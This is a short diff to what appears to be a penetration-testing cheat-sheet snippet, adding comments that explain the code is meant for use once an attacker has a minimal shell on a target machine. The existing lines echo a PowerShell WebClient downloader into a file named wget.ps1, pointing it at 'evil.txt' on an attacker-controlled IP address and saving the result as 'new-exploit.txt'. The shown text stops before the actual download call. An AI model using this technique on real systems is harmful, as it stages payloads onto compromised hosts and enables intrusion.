@@ -1,3 +1,8 @@
+# Some Context
+# update the below lines with info from your current attacker machine
+# the idea here is that you have a minimal shell on the target
+
+
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
 echo $url = "http://192.168.119.198/evil.txt" >>wget.ps1
 echo $file = "new-exploit.txt" >>wget.ps1
